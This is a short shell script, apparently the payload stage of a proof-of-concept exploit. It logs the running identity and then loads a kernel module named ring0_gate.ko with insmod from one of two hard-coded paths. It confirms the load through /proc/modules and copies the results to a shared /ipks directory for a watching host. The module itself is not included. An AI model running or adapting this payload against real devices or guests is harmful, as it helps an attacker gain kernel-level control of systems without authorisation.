#!/bin/sh
echo "=== POC EXECUTED ===" > /tmp/poc_result.txt
echo "ID: $(id)" >> /tmp/poc_result.txt
echo "PID: $$" >> /tmp/poc_result.txt
echo "PWD: $(pwd)" >> /tmp/poc_result.txt

if [ -f /ipks/ring0_gate.ko ]; then
    echo "Found /ipks/ring0_gate.ko" >> /tmp/poc_result.txt
    insmod /ipks/ring0_gate.ko >> /tmp/poc_result.txt 2>&1
    echo "insmod exit: $?" >> /tmp/poc_result.txt
elif [ -f /opt/upt/apps/apps/ipks/ring0_gate.ko ]; then
    echo "Found /opt/upt/apps/apps/ipks/ring0_gate.ko" >> /tmp/poc_result.txt
    insmod /opt/upt/apps/apps/ipks/ring0_gate.ko >> /tmp/poc_result.txt 2>&1
    echo "insmod exit: $?" >> /tmp/poc_result.txt
fi

if [ -f /proc/modules ]; then
    grep ring0 /proc/modules >> /tmp/poc_result.txt
fi

# Copy result to /ipks so host can see it
cp /tmp/poc_result.txt /ipks/poc_result.txt 2>/dev/null
cp /tmp/poc_result.txt /opt/upt/apps/apps/ipks/poc_result.txt 2>/dev/null
